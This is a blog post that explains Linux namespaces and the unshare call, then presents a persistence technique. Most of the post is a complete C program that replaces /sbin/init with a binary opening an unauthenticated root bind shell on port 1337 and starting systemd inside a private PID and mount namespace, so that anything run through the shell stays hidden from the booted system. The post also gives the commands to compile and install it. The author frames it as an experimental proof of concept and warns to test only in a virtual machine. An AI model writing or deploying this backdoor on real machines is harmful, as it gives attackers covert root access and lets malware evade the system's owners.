---
title: Unshare Linux Persistence Technique
published: true
---

You may have heard of the term "containers" when dealing with a tool like Docker, but containerization is actually a feature of the Linux kernel. Docker just utilizes this feature to provide it's functionality. A large portion of this functionality is part of the `unshare` function. Lets take a look at the man page for a description of this function:

```
unshare() allows a process (or thread) to disassociate parts of its execution
context that are currently being shared  with  other  processes (or  threads)
```

Further down in the man page we can see what can be disassociated:

```
CLONE_FILES
       Unshare the file descriptor table, so that the calling process no longer
       shares its file descriptors with any other process.

CLONE_FS
       Unshare filesystem attributes, so that the calling process no longer
       shares its root directory (chroot(2)), current directory (chdir(2)), or
       umask (umask(2)) attributes with any other process.

CLONE_NEWCGROUP (since Linux 4.6)
       Unshare the cgroup namespace.

CLONE_NEWIPC (since Linux 2.6.19)
       Unshare the IPC namespace, so that the calling process has a private copy
       of the IPC namespace which is not shared with any other process.

CLONE_NEWNET (since Linux 2.6.24)
       Unshare the network namespace, so that the calling process is moved into
       a new network namespace which is not shared with any previously existing
       process.

CLONE_NEWNS
       Unshare the mount namespace, so that the calling process has a private
       copy of its namespace which is not shared with any other process.

CLONE_NEWPID (since Linux 3.8)
       Unshare the PID namespace, so that the calling process has a new PID
       namespace for its children which is not shared with any previously
       existing process. The calling process is not moved into the new
       namespace. The first child created by the calling process will have the
       process ID 1 and will assume the role of init(1) in the new namespace.

CLONE_NEWUSER (since Linux 3.8)
       Unshare the user namespace, so that the calling process is moved into a
       new user namespace which is not shared with any previously existing
       process.

CLONE_NEWUTS (since Linux 2.6.19)
       Unshare the UTS IPC namespace, so that the calling process has a private
       copy of the UTS namespace which is not shared with any other process.

CLONE_SYSVSEM (since Linux 2.6.26)
       Unshare System V semaphore adjustment (semadj) values, so that the
       calling process has a new empty semadj list that is not shared with any
       other process.
```

There are a ton of things we can do here. We can use `CLONE_NEWNS` to make a completely new copy **private** copy of the mount namespace. Meaning anything mounted in this process will not be visible from any other processes. `CLONE_NEWPID` allows us to get a brand new PID table. This is why if you look at the process list inside of a Docker container you will only see the processes inside of that container.

### Simple Is Better

So the above information is cool, but lets take a look at an easy way to test some of this stuff out. Conveniently, Linux provides us with an `unshare` binary that wraps up this functionality and makes it easier to use. Here is a simple example where the PID namespace is unshared: `~# sudo unshare -pf --mount-proc /bin/bash`. After executing this command, run `ps aux` and you will only see 2 processes instead of the entire list. The flags in this command are `-p unshare PID namespace`, `-f fork`, and `--mount-proc remount the proc file system`. The `/proc` directory needs to be remounted as the old mount will still have the original pids.

### What About This Persistence Thing?

We've figured out how this containerization thing works a bit, but how can we use it as a persistence mechanism? One thing to keep in mind is that once something is unshared from a container, it can't view the outside namespace. It can only see its own private namespace. From a persistence perspective, if we were to run malware outside of the container then it wouldn't be visible inside of the container if the PID namespace was unshared. Sounds cool right?

Now lets consider that we could containerize the entire operating system on boot, but leave a process running on the outside of the container that we, as the attacker, can access via a bind shell. When the attacker enters the bind shell, they would be outside of the container, and anything they run would be hidden from the container.

In order to containerize the entire operating system, we need to understand what happens on boot. If you run `ps aux` and look at the first process, you will usually see something like `/sbin/init` for PID 1. `/sbin/init` is the first program run after the operating system is loaded. `/sbin/init` is actually a symbolic link to `/lib/systemd/systemd`, so that is the real application that is started first. If we replace `/sbin/init` with our own binary we can have `/lib/systemd/systemd` start in a containerized environment. `/lib/systemd/systemd` will kick off all the other processes needed for a functional operating system.

### Custom /sbin/init

```c
#define _GNU_SOURCE

#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <netinet/in.h>

void setup_listener(void) {
    int serv_sockfd, client_sockfd;
    struct sockaddr_in servaddr;
    pid_t pid;

    if ((serv_sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(1337);
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(serv_sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1) {
        perror("bind");
        close(serv_sockfd);
        exit(EXIT_FAILURE);
    }

    if (listen(serv_sockfd, 10) == -1) {
        perror("listen");
        close(serv_sockfd);
        exit(EXIT_FAILURE);
    }

    while (1) {
        if ((client_sockfd = accept(serv_sockfd, NULL, NULL)) == -1) {
            perror("accept");
            close(serv_sockfd);
            exit(EXIT_FAILURE);
        }

        pid = fork();
        if (pid == -1) {
            perror("fork");
            close(serv_sockfd);
            exit(EXIT_FAILURE);
        } else if (pid == 0) {
            dup2(client_sockfd, 0);
            dup2(client_sockfd, 1);
            dup2(client_sockfd, 2);

            execve("/bin/bash", NULL, NULL);
        }
    }
    close(serv_sockfd);
}

void setup_ns(void) {
    int flags, wstatus;
    char *new_argv[] = { "splash", NULL };
    pid_t pid;

    flags = CLONE_FILES | CLONE_NEWNS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWUTS;

    if (unshare(flags) == -1) {
        perror("unshare");
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        if (mount("none", "/proc", NULL, MS_PRIVATE | MS_REC, NULL) == -1) {
            perror("mount");
            exit(EXIT_FAILURE);
        }
        if (mount("proc", "/proc", "proc", MS_NOSUID | MS_NOEXEC | MS_NODEV, NULL) == -1) {
            perror("mount");
            exit(EXIT_FAILURE);
        }
        execve("/lib/systemd/systemd", new_argv, NULL);
    } else {
        waitpid(pid, &wstatus, 0);
    }
}


int main(int argc, char *argv[]) {
    pid_t pid;

    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        setup_listener();
    } else {
        setup_ns();
    }

    exit(EXIT_SUCCESS);
}
```

The gist of this code is that it first sets up the bind shell on port 1337, then calls `setup_ns()` to unshare the specified namespaces, then it remounts `/proc` and executes `/lib/systemd/systemd splash` in the newly created container.

### Testing

The code above was tested on Kali 2020. You should use a virtual machine and take a snapshot of it in a clean state. I am not responsible if you brick your machine. Okay disclaimer aside, now compile with `gcc -o init <filename>.c`, then `sudo mv init /sbin/init && sudo chown root.root /sbin/init`. Reboot the machine.

The machine should boot up normally, login as you normally would. Take a look around, everything should look completely normal. Believe it or not, you're actually inside of a container like environment. Lets get to the environment outside of the container. Run `nc localhost 1337`. This will give you a non-interactive shell. If you run `ps`, you should see some output. Experiment time!!! Open another terminal (or tab), and run `nc localhost 1337` again. You'll now have 2 terminal sessions outside of the container. In the first terminal session run `yes test`. This will continuously print out "test" on the screen (we just need this to keep a process running). In the second terminal session, run `ps aux | grep yes`. You should see the process for `yes test` running. Now open another terminal, and remember that this terminal session is inside the container (since we're not netcating out). In that terminal session run `ps aux | grep yes`. You will **not** see the process as we are in a container. This means any malware running outside the container is hidden from the full operating system running inside.

### Conclusion

This is a pretty invasive persistence technique, and I wouldn't recommend using it. It is something that is unique and interesting, but that is about it. The source code provided is a PoC and shouldn't be considered a fully working example. You will figure this out when you try to reboot the machine and it hangs! Hope you enjoyed this article and learned something about Linux containerization.
